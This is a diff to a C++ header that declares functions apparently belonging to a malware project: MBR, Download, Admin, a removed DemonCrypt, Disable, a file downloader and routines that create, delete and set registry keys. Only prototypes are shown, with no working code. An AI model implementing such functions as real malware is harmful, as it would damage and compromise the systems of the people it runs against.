@@ -1,3 +1,6 @@
+#include <string>
+using namespace std;
+
 #ifndef MBR_H
 #define MBR_H
 int MBR();
@@ -43,7 +46,27 @@ int Download();
 int Admin();
 #endif
 
-#ifndef DC_H
-#define DC_H
-int DemonCrypt();
+#ifndef DISABLE_H
+#define DISABLE_H
+int Disable();
+#endif
+
+#ifndef GETFURL_H
+#define GETFURL_H
+bool GetFileURL(const wchar_t* dwnld_URL, const wchar_t* savepath);
+#endif
+
+#ifndef CRK_H
+#define CRK_H
+bool CRK(HKEY key, wstring path, wstring name);
+#endif
+
+#ifndef DRK_H
+#define DRK_H
+bool DRK(HKEY key, wstring path, wstring name);
+#endif
+
+#ifndef SRV_H
+#define SRV_H
+bool SRV(HKEY key, wstring path, wstring name, wstring value);
 #endif
